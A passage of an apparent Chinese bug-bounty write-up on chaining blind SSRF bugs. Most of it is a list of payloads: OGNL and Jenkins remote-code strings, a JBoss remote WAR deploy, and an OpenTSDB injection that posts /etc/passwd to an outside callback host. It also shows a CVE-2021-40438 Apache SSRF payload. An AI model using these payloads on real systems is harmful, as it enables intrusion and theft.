AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://sec.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com
+</span></span><span style="display:flex;"><span>/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2Fsec1.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
+</span></span><span style="display:flex;"><span>/search?q=Apple&amp;shards=http://sec2.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/solr/collection/config%23&amp;stream.body={&#34;set-property&#34;:{&#34;xxx&#34;:&#34;yyy&#34;}}
+</span></span><span style="display:flex;"><span>/solr/db/select?q=orange&amp;shards=http://sec3.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/solr/atom&amp;qt=/select?fl=id,name:author&amp;wt=json
+</span></span><span style="display:flex;"><span>/xxx?q=aaa%26shards=http://sec4.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/solr 
+</span></span><span style="display:flex;"><span>/xxx?q=aaa&amp;shards=http://sec5.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/solr
+</span></span><span style="display:flex;"><span>/solr/gettingstarted/select?q={!xmlparser v=&#39;&lt;!DOCTYPE a SYSTEM &#34;http://sec6.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/xxx&#34;&#39;&gt;&lt;a&gt;&lt;/a&gt;&#39;
+</span></span><span style="display:flex;"><span>/xxx?q={!type=xmlparser v=&#34;&lt;!DOCTYPE a SYSTEM &#39;http://sec7.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/solr&#39;&gt;&lt;a&gt;&lt;/a&gt;&#34;}
+</span></span><span style="display:flex;"><span>?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{&#39;command&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&#34;http://sec8.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/result%3d&#34;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&#34;GET&#34;),%23http.connect(),%23http.getInputStream()}
+</span></span><span style="display:flex;"><span>/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://sec9.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/utils/cmd.war 
+</span></span><span style="display:flex;"><span>/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20sec10.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com%5Cu0022)%7D%252b%5Cu0027
+</span></span><span style="display:flex;"><span>/confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20sec11.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com%5Cu0022)%7D%252b%5Cu0027
+</span></span><span style="display:flex;"><span>/wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20sec12.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com%5Cu0022)%7D%252b%5Cu0027
+</span></span><span style="display:flex;"><span>/rest/sharelinks/1.0/link?url=https://sec20.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/
+</span></span><span style="display:flex;"><span>/plugins/servlet/oauth/users/icon-uri?consumerUri=http://sec21.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com
+</span></span><span style="display:flex;"><span>/plugins/servlet/gadgets/makeRequest?url=https://sec22.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com:443@example.com
+</span></span><span style="display:flex;"><span>/plugins/servlet/oauth/users/icon-uri?consumerUri=http://sec23.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com
+</span></span><span style="display:flex;"><span>/q?start=2016/04/13-10:21:00&amp;ignore=2&amp;m=sum:jmxdata.cpu&amp;o=&amp;yrange=[0:]&amp;key=out%20right%20top&amp;wxh=1900x770%60curl%20sec24.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com%60&amp;style=linespoint&amp;png
+</span></span><span style="display:flex;"><span>/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#39;wget%20--post-file%20/etc/passwd%20sec25.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com&#39;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
+</span></span><span style="display:flex;"><span>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://sec26.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/%23&amp;login=orange&amp;password=tsai
+</span></span><span style="display:flex;"><span>/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://sec27.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/&#39;)%0a@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0aimport Orange;
+</span></span><span style="display:flex;"><span>/proxy.stream?origin=http://sec28.jrebeqk3azx4tdvm6ucvvfmhe8k18q.oastify.com/
+</span></span></code></pre></div><p>使用 url-health-check SSRF 发送这些payload 到内网中存活的主机上，看是否会触发反连请求。</p>
+<p>最终，很幸运地发现了第三个blind ssrf :<br>
+172.31.1.147:8181  上存在 SSRF Canary: Apache mod_proxy SSRF (CVE-2021-40438)</p>
+<p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>url=http://www.instagram.com.customer2.app.localhost.my.company.172.31.1.147.nip.io:8181%2f%3funix%3aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%7chttp%3a%2f%2fsrc2%2etyv8vxkpakl1c6wdaufca215ewkm8b%2eoastify%2ecom&amp;sourceUrl=https://www.target.com.aws.x53a35icvo9f9qropjyxphlj9afa3z.oastify.comZZ
+</span></span></code></pre></div><p>收到的反连请求报文如下:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Range: bytes=0-32768
+</span></span><span style="display:flex;"><span>User-Agent: Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip,deflate
+</span></span><span style="display:flex;"><span>Host: jylcdo1swgtycglfhtcphe7bd2js7h.oastify.com
+</span></span><span style="display:flex;"><span>Cache-Control: max-age=259200
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><p>User-Agent 为 <code>Slackbot-LinkExpanding 1.0</code> ,由于对 Slackbot-LinkExpanding 1.0 不是很了解，所以只能止步于此了。</p>
+<p>至此，我将两个Blind SSRF 串了起来:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>url-health-check SSRF ---payload--&gt; 172.31.1.147:8181 ---apache SSRF--&gt; http://src2.tyv8vxkpakl1c6wdaufca215ewkm8b.oastify.com
+</span></span></code></pre></div>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+         
+          <li><a href="/categories">Categories</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#第一个blind-ssrf">第一个Blind SSRF</a></li>
+    <li><a href="#第二个blind-ssrf半盲">第二个Blind SSRF(半盲)</a></li>
+    <li><a href="#第三个blind-ssrf">第三个Blind SSRF</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&text=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fshangrui-hash.github.io%2fposts%2fbugbounty%2fstory%2f%25E6%2588%2591%25E6%2598%25AF%25E5%25A6%2582%25E4%25BD%2595%25E6%258C%2596%25E5%2588%25B0%25E4%25B8%2589%25E4%25B8%25AA%25E4%25BB%25B7%25E5%2580%25BC250%25E7%25BE%258E%25E5%2588%2580%25E7%259A%2584blind-ssrf%25E6%25BC%258F%25E6%25B4%259E%25E7%259A%2584%2f&title=%e6%88%91%e6%98%af%e5%a6%82%e4%bd%95%e6%8c%96%e5%88%b0%e4%b8%89%e4%b8%aaBlind%20SSRF%e6%bc%8f%e6%b4%9e%e5%b9%b6%e8%b5%9a%e5%88%b0250%e7%be%8e%e5%88%80%e8%b5%8f%e9%87%91%e7%9a%84" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
